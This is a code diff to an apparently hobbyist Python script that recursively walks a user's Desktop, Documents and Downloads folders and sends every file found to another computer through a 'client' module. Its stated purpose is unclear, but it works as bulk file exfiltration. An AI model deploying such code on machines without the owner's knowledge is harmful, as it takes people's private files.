@@ -1,4 +1,6 @@
 import os
+import time
+import client
 
 folders = ["Desktop", "Documents", "Downloads"]    
 
@@ -15,7 +17,8 @@ def getFilesAndDirsInPath(path, filterWithBank):
     return fileandDirList
 
 def sendFile(file):         #TODO : remove and make its own module/class
-    print("sending file ot main computer")
+    client.sendFile(file)
+    time.sleep(2)
 
 def handleFilesAndDirs(folderPathList, curDepth = 0, maxDepth = 3):
     for path, folder in zip(folderPathList, folders):
@@ -25,7 +28,8 @@ def handleFilesAndDirs(folderPathList, curDepth = 0, maxDepth = 3):
         fileAndDirList = getFilesAndDirsInPath(path, isZeroDepth)
         for fileOrDir in fileAndDirList:
             if os.path.isfile(path+"\\"+fileOrDir):
-                file = fileOrDir
+                print("file path in fileStruct.py: " +  fileOrDir)
+                file = path+"\\"+fileOrDir
                 sendFile(file)
             elif os.path.isdir(path+"\\"+fileOrDir):
                 if curDepth >= maxDepth:
@@ -36,9 +40,11 @@ def handleFilesAndDirs(folderPathList, curDepth = 0, maxDepth = 3):
             else:
                 print("weird file format (else statemnt)")
 
-handleFilesAndDirs(folderPathList)
-
-
+def getFiles():
+    client.openConnection()
+    handleFilesAndDirs(folderPathList)
+    # handleFilesAndDirs(["D:\\Github Projects\\gitPractice\\filesToSend"])
+    client.closeConnection()
 
 # test code
 # getFilesInPath(os.path.abspath(""))
